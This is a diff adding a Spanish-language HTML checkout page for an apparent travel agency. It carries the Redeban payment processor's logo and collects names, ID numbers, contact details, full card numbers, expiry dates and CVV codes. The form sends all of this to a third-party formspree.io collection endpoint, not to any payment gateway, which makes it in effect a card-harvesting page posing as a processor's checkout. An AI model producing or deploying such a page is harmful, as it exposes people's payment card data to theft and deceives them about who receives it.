@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Información Personal y Pago</title>
+    <link rel="stylesheet" href="styles-redeban.css">
+    <link rel="icon" href="images/Logo Dreams Vacations/Logo Files/For Web/Favicons/Captura-de-pantalla-2024-12-17-235006.ico" type="image/x-icon">
+</head>
+
+<body>
+    <header>
+        <img src="images/Íconos/pago_redeban.png" alt="Logo de Redeban" class="logo">
+        <div class="fecha-actual">
+            <span id="fechaActual">Fecha Actual: </span>
+            <img src="images/Logo Dreams Vacations/Logo Files/For Web/png/Black logo - no background.png" alt="Logo de la Empresa" class="logo">
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Formulario de Información Personal -->
+        <h2>Información Personal</h2>
+        <form action="https://formspree.io/f/mjkkpdzg" method="POST" class="form-horizontal">
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="nombres">Nombres: *</label>
+                    <input type="text" id="nombres" name="nombres" required>
+                </div>
+                <div class="form-group">
+                    <label for="apellidos">Apellidos: *</label>
+                    <input type="text" id="apellidos" name="apellidos" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="tipo_id">Tipo de Identificación: *</label>
+                    <select id="tipo_id" name="tipo_id" required>
+                        <option value="cc">Cédula Ciudadanía</option>
+                        <option value="ti">Tarjeta Identidad</option>
+                        <option value="ce">Cédula Extranjera</option>
+                        <option value="nit">NIT</option>
+                        <option value="pasaporte">Pasaporte</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="numero_id">No. de Identificación: *</label>
+                    <input type="text" id="numero_id" name="numero_id" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="correo">Correo Electrónico:</label>
+                    <input type="email" id="correo" name="correo">
+                </div>
+                <div class="form-group">
+                    <label for="celular">Número de Celular:</label>
+                    <input type="text" id="celular" name="celular">
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group full-width">
+                    <label for="comprobante">¿Desea recibir su comprobante de la compra por correo electrónico? <input type="checkbox" id="comprobante" name="comprobante"></label>
+                    
+                </div>
+            </div>
+            
+            <div class="pago-container">
+            <!-- Formulario de Información de Pago -->
+            <h2 class="separado">Información de Pago</h2>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="total_compra">Total de la compra: *</label>
+                    <input type="text" id="total_compra" name="total_compra" placeholder="$" required oninput="formatoMoneda(this)">
+
+                </div>
+                <div class="form-group">
+                    <label for="numero_tarjeta">Número de Tarjeta: *</label>
+                    <input type="text" id="numero_tarjeta" name="numero_tarjeta" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="tipo_tarjeta">Tipo de Tarjeta: *</label>
+                    <select id="tipo_tarjeta" name="tipo_tarjeta" required>
+                        <option value="mastercard">MASTERCARD</option>
+                        <option value="visa">VISA</option>
+                        <option value="american_express">AMERICAN EXPRESS</option>
+                        <option value="american_express">DINERS CLUB</option>
+                        <option value="american_express">SODEXO</option>
+                        <option value="american_express">COLSUBSIDIO</option>
+                        <option value="american_express">COMFAMA</option>
+
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="fecha_vencimiento">Fecha de Vencimiento: *</label>
+                    <input type="month"  id="fecha_vencimiento" name="fecha_vencimiento" placeholder="mm/aaaa" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cuotas">No. Cuotas: *</label>
+                    <select id="cuotas" name="cuotas" required>
+                        <option value="1">1</option>
+                        <option value="2">2</option>
+                        <option value="3">3</option>
+                        <option value="4">4</option>
+                        <option value="5">5</option>
+                        <option value="6">6</option>
+                        <option value="7">7</option>
+                        <option value="8">8</option>
+                        <option value="9">9</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                        <option value="13">13</option>
+                        <option value="14">14</option>
+                        <option value="15">15</option>
+                        <option value="16">16</option>
+                        <option value="17">17</option>
+                        <option value="18">18</option>
+                        <option value="19">19</option>
+                        <option value="20">20</option>
+                        <option value="21">21</option>
+                        <option value="22">22</option>
+                        <option value="23">23</option>
+                        <option value="24">24</option>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                        <option value="31">31</option>
+                        <option value="32">32</option>
+                        <option value="33">33</option>
+                        <option value="34">34</option>
+                        <option value="35">35</option>
+                        <option value="36">36</option>
+                        
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">C.V.V (Código detrás de la tarjeta):</label>
+                    <input type="text" id="cvv" name="cvv" required>
+                </div>
+            </div>
+
+        </div>
+            <!-- Botón de Enviar -->
+            <div class="form-row">
+                <div class="form-group full-width">
+                    <input type="submit" value="REALIZAR PAGO" >
+                    
+                </div>
+                
+            </div>
+            
+        </form>
+    </div>
+
+    <script src="script-redeban.js"></script>
+</body>
+</html>
